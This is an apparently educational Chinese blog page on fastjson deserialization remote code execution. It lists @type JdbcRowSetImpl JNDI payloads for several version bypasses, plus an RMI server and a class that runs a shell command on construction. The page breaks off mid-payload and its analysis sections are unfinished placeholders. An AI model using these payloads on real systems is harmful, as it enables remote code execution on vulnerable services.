<!doctype html><html lang=zh-cn class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.101.0"><link rel=canonical type=text/html href=/docs/51.%E5%AE%89%E5%85%A8/><link rel=alternate type=application/rss+xml href=/docs/51.%E5%AE%89%E5%85%A8/index.xml><meta name=robots content="noindex, nofollow"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>安全 | Herbdocs</title><meta name=description content="Introduction
安全漏洞相关
"><meta property="og:title" content="安全"><meta property="og:description" content="Herb's blog"><meta property="og:type" content="website"><meta property="og:url" content="/docs/51.%E5%AE%89%E5%85%A8/"><meta property="og:site_name" content="Herbdocs"><meta itemprop=name content="安全"><meta itemprop=description content="Herb's blog"><meta name=twitter:card content="summary"><meta name=twitter:title content="安全"><meta name=twitter:description content="Herb's blog"><link rel=preload href=/scss/main.min.dcab2c3dae6e6fefb7672f19e4b612cc4e75ca208740f642aa2f1fe378478a8f.css as=style><link href=/scss/main.min.dcab2c3dae6e6fefb7672f19e4b612cc4e75ca208740f642aa2f1fe378478a8f.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.6.0.min.js integrity=sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK crossorigin=anonymous></script>
<script src=https://unpkg.com/lunr@2.3.9/lunr.min.js integrity=sha384-203J0SNzyqHby3iU6hzvzltrWi/M41wOP5Gu+BiJMz5nwKykbkUx8Kp7iti0Lpli crossorigin=anonymous></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-00000000-0","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=td-section><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class=navbar-logo><img width=6% style=margin-bottom:1% src=/favicons/favicon.ico></span><span class=font-weight-bold>&nbsp;Herbdocs</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/about/><span>About</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/docs/><span class=active>Documentation</span></a></li><li class="nav-item dropdown mr-4 d-none d-lg-block"><a class="nav-link dropdown-toggle" href=# id=navbarDropdown role=button data-toggle=dropdown aria-haspopup=true aria-expanded=false>Chinese</a><div class=dropdown-menu aria-labelledby=navbarDropdownMenuLink><a class=dropdown-item href=/en/>English</a></div></li></ul></div><div class="navbar-nav d-none d-lg-block"><input type=search class="form-control td-search-input" placeholder="&#xf002; 站内搜索…" aria-label=站内搜索… autocomplete=off></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><div class=td-content><div class="pageinfo pageinfo-primary d-print-none"><p>这是本节的多页打印视图。
<a href=# onclick="return print(),!1">点击此处打印</a>.</p><p><a href=/docs/51.%E5%AE%89%E5%85%A8/>返回本页常规视图</a>.</p></div><h1 class=title>安全</h1><ul><li>1: <a href=#pg-939ab01a942e5193db9c1014a16e96ee>fastjson远程执行漏洞分析</a></li><li>2: <a href=#pg-ea185f40244b6a031af62755d50175fa>Log4j2远程执行漏洞</a></li></ul><div class=content><h1 id=introduction>Introduction</h1><p>安全漏洞相关</p></div></div><div class=td-content><h1 id=pg-939ab01a942e5193db9c1014a16e96ee>1 - fastjson远程执行漏洞分析</h1><h1 id=背景>背景</h1><p>阿里巴巴的fastjson作为java语言的json解析包，因为其易用性在国内被广泛应用。但是其安全性一直被诟病。因此，本文对其多次安全漏洞进行了分析总结。</p><h1 id=fastjson安全特性>fastjson安全特性</h1><p>fastjson存在一个特殊的key：@type。它可以指定将json字符串反序列化为value中指定的任意类。形如：</p><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#000>&#34;@type&#34;</span>:<span style=color:#c41a16>&#34;com.xx.hello&#34;</span>, <span style=color:#000>&#34;hello&#34;</span>:<span style=color:#c41a16>&#34;xx&#34;</span>}
</span></span></code></pre></td></tr></table></div></div></div><p>能通过fastjson的JSON.parseObject方法反序列化为com.xx.Hello DTO类的一个实例对象。
而fastjson的诸多安全漏洞，都是围绕@type产生</p><h1 id=漏洞案例>漏洞案例</h1><p>详细代码请参考：<a href=https://github.com/chnherb/java-demo/tree/master/src/main/java/com/huangbo/fastjson>java-demo fastjson</a></p><h2 id=服务端代码>服务端代码</h2><p>1、rmi server</p><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>com.sun.jndi.rmi.registry.ReferenceWrapper</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>lombok.Data</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>javax.naming.NamingException</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>javax.naming.Reference</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>java.rmi.AlreadyBoundException</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>java.rmi.RemoteException</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>java.rmi.registry.LocateRegistry</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>java.rmi.registry.Registry</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>public</span> <span style=color:#a90d91>class</span> <span style=color:#3f6e75>RmiFastJsonSafeServer</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a90d91>public</span> <span style=color:#a90d91>static</span> <span style=color:#a90d91>void</span> <span style=color:#000>main</span><span style=color:#000>(</span><span style=color:#000>String</span><span style=color:#000>[]</span> <span style=color:#000>args</span><span style=color:#000>)</span> <span style=color:#a90d91>throws</span> <span style=color:#000>RemoteException</span><span style=color:#000>,</span> <span style=color:#000>NamingException</span><span style=color:#000>,</span> <span style=color:#000>AlreadyBoundException</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>        <span style=color:#000>Registry</span> <span style=color:#000>registry</span> <span style=color:#000>=</span> <span style=color:#000>LocateRegistry</span><span style=color:#000>.</span><span style=color:#836c28>createRegistry</span><span style=color:#000>(</span><span style=color:#000>1099</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span><span style=color:#177500>//        Reference reference = new javax.naming.Reference(&#34;com.huangbo.fastjson.Hello1&#34;, &#34;com.huangbo.fastjson.Hello1&#34;, &#34;http://127.0.0.1:1099/&#34;);
</span></span></span><span style=display:flex><span><span style=color:#177500></span>        <span style=color:#000>Reference</span> <span style=color:#000>reference</span> <span style=color:#000>=</span> <span style=color:#a90d91>new</span> <span style=color:#000>javax</span><span style=color:#000>.</span><span style=color:#836c28>naming</span><span style=color:#000>.</span><span style=color:#836c28>Reference</span><span style=color:#000>(</span><span style=color:#c41a16>&#34;com.huangbo.fastjson.Hello&#34;</span><span style=color:#000>,</span> <span style=color:#c41a16>&#34;com.huangbo.fastjson.Hello&#34;</span><span style=color:#000>,</span> <span style=color:#c41a16>&#34;http://127.0.0.1:1099/&#34;</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>        <span style=color:#000>ReferenceWrapper</span> <span style=color:#000>referenceWrapper</span> <span style=color:#000>=</span> <span style=color:#a90d91>new</span> <span style=color:#000>com</span><span style=color:#000>.</span><span style=color:#836c28>sun</span><span style=color:#000>.</span><span style=color:#836c28>jndi</span><span style=color:#000>.</span><span style=color:#836c28>rmi</span><span style=color:#000>.</span><span style=color:#836c28>registry</span><span style=color:#000>.</span><span style=color:#836c28>ReferenceWrapper</span><span style=color:#000>(</span><span style=color:#000>reference</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>        <span style=color:#000>registry</span><span style=color:#000>.</span><span style=color:#836c28>bind</span><span style=color:#000>(</span><span style=color:#c41a16>&#34;hello&#34;</span><span style=color:#000>,</span> <span style=color:#000>referenceWrapper</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000>}</span>
</span></span><span style=display:flex><span><span style=color:#000>}</span>
</span></span></code></pre></td></tr></table></div></div></div><p>2、hello.java<style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a90d91>import</span> <span style=color:#000>lombok.Data</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#000>@Data</span>
</span></span><span style=display:flex><span><span style=color:#a90d91>public</span> <span style=color:#a90d91>class</span> <span style=color:#3f6e75>Hello</span> <span style=color:#000>{</span> <span style=color:#177500>// 这里需要为public才能调用到
</span></span></span><span style=display:flex><span><span style=color:#177500></span>    <span style=color:#000>String</span> <span style=color:#000>hello</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span>    <span style=color:#a90d91>public</span> <span style=color:#000>Hello</span><span style=color:#000>()</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>        <span style=color:#a90d91>try</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>            <span style=color:#000>Runtime</span><span style=color:#000>.</span><span style=color:#836c28>getRuntime</span><span style=color:#000>().</span><span style=color:#836c28>exec</span><span style=color:#000>(</span><span style=color:#a90d91>new</span> <span style=color:#000>String</span><span style=color:#000>[]{</span><span style=color:#c41a16>&#34;/bin/bash&#34;</span><span style=color:#000>,</span> <span style=color:#c41a16>&#34;-c&#34;</span><span style=color:#000>,</span>
</span></span><span style=display:flex><span>                    <span style=color:#c41a16>&#34;/Applications/Calendar.app/Contents/MacOS/Calendar&#34;</span><span style=color:#000>});</span>
</span></span><span style=display:flex><span>        <span style=color:#000>}</span> <span style=color:#a90d91>catch</span> <span style=color:#000>(</span><span style=color:#000>Exception</span> <span style=color:#000>e</span><span style=color:#000>)</span> <span style=color:#000>{</span>
</span></span><span style=display:flex><span>        <span style=color:#000>}</span>
</span></span><span style=display:flex><span>    <span style=color:#000>}</span>
</span></span><span style=display:flex><span><span style=color:#000>}</span>
</span></span></code></pre></td></tr></table></div></div></div></p><h2 id=1-本地调用示例>1、本地调用示例</h2><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#177500>// 1、这种调用方式不需要 hello 是public
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>String</span> <span style=color:#000>json</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;{\&#34;@type\&#34;: \&#34;com.huangbo.fastjson.Hello\&#34;, \&#34;hello\&#34;:\&#34;hahaha\&#34;}&#34;</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#000>Object</span> <span style=color:#000>obj</span> <span style=color:#000>=</span> <span style=color:#000>JSON</span><span style=color:#000>.</span><span style=color:#836c28>parseObject</span><span style=color:#000>(</span><span style=color:#000>json</span><span style=color:#000>);</span>
</span></span><span style=display:flex><span><span style=color:#000>System</span><span style=color:#000>.</span><span style=color:#836c28>out</span><span style=color:#000>.</span><span style=color:#836c28>println</span><span style=color:#000>(</span><span style=color:#000>obj</span><span style=color:#000>);</span><span style=color:#000>待补充</span>
</span></span></code></pre></td></tr></table></div></div></div><h3 id=原理分析>原理分析</h3><p>待补充</p><h2 id=2-远程调用示例>2、远程调用示例</h2><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#177500>//2、fastjson 1.2.24
</span></span></span><span style=display:flex><span><span style=color:#177500>//这种调用方式需要 hello 是public
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>String</span> <span style=color:#000>payload</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;{\&#34;@type\&#34;: \&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/hello\&#34;,\&#34;autoCommit\&#34;:true}&#34;</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#000>JSON</span><span style=color:#000>.</span><span style=color:#836c28>parse</span><span style=color:#000>(</span><span style=color:#000>payload</span><span style=color:#000>);</span>
</span></span></code></pre></td></tr></table></div></div></div><h3 id=原理分析-1>原理分析</h3><p>待补充</p><h2 id=3-lxx-漏洞>3、Lxx;漏洞</h2><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#177500>// 3、fastjson 1.2.41
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>ParserConfig</span><span style=color:#000>.</span><span style=color:#836c28>getGlobalInstance</span><span style=color:#000>().</span><span style=color:#836c28>setAutoTypeSupport</span><span style=color:#000>(</span><span style=color:#a90d91>true</span><span style=color:#000>);</span> <span style=color:#177500>// 必须开启才能调用
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>String</span> <span style=color:#000>payload</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;{\&#34;@type\&#34;: \&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/hello\&#34;,\&#34;autoCommit\&#34;:true}&#34;</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#000>JSON</span><span style=color:#000>.</span><span style=color:#836c28>parse</span><span style=color:#000>(</span><span style=color:#000>payload</span><span style=color:#000>);</span>
</span></span></code></pre></td></tr></table></div></div></div><h3 id=原理分析-2>原理分析</h3><p>待补充</p><h2 id=4-llxx-漏洞>4、LLxx;;漏洞</h2><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#177500>// 4、fastjson 1.2.42
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>ParserConfig</span><span style=color:#000>.</span><span style=color:#836c28>getGlobalInstance</span><span style=color:#000>().</span><span style=color:#836c28>setAutoTypeSupport</span><span style=color:#000>(</span><span style=color:#a90d91>true</span><span style=color:#000>);</span> <span style=color:#177500>// 必须开启才能调用
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>String</span> <span style=color:#000>payload</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;{\&#34;@type\&#34;: \&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/hello\&#34;,\&#34;autoCommit\&#34;:true}&#34;</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#000>JSON</span><span style=color:#000>.</span><span style=color:#836c28>parse</span><span style=color:#000>(</span><span style=color:#000>payload</span><span style=color:#000>);</span>
</span></span></code></pre></td></tr></table></div></div></div><h3 id=原理分析-3>原理分析</h3><p>待补充</p><h2 id=5-漏洞>5、[漏洞</h2><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#177500>// 5、fastjson 1.2.43
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>ParserConfig</span><span style=color:#000>.</span><span style=color:#836c28>getGlobalInstance</span><span style=color:#000>().</span><span style=color:#836c28>setAutoTypeSupport</span><span style=color:#000>(</span><span style=color:#a90d91>true</span><span style=color:#000>);</span> <span style=color:#177500>// 必须开启才能调用
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>String</span> <span style=color:#000>payload</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;{\&#34;@type\&#34;: \&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/hello\&#34;,\&#34;autoCommit\&#34;:true]}&#34;</span><span style=color:#000>;</span>
</span></span><span style=display:flex><span><span style=color:#000>JSON</span><span style=color:#000>.</span><span style=color:#836c28>parse</span><span style=color:#000>(</span><span style=color:#000>payload</span><span style=color:#000>);</span>
</span></span></code></pre></td></tr></table></div></div></div><h3 id=原理分析-4>原理分析</h3><p>待补充</p><h2 id=6-缓存漏洞>6、缓存漏洞</h2><style>.td-content .highlight{margin-top:.5rem;margin-bottom:.5rem}.code-collapse1{overflow-y:auto;max-height:500px;overflow-x:auto;max-width:100%}</style><div class=code-collapse1><div class=highlight><div style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#177500>// 6、fastjson 1.2.47
</span></span></span><span style=display:flex><span><span style=color:#177500></span><span style=color:#000>String</span> <span style=color:#000>payload</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;{&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;    \&#34;a\&#34;:{&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;        \&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;        \&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;    },&#34;</span> <span style=color:#000>+</span>
</span></span><span style=display:flex><span>        <span style=color:#c41a16>&#34;    \&#34;b\&#34;:{&#34;</span> <span style=color:#000>+</span>
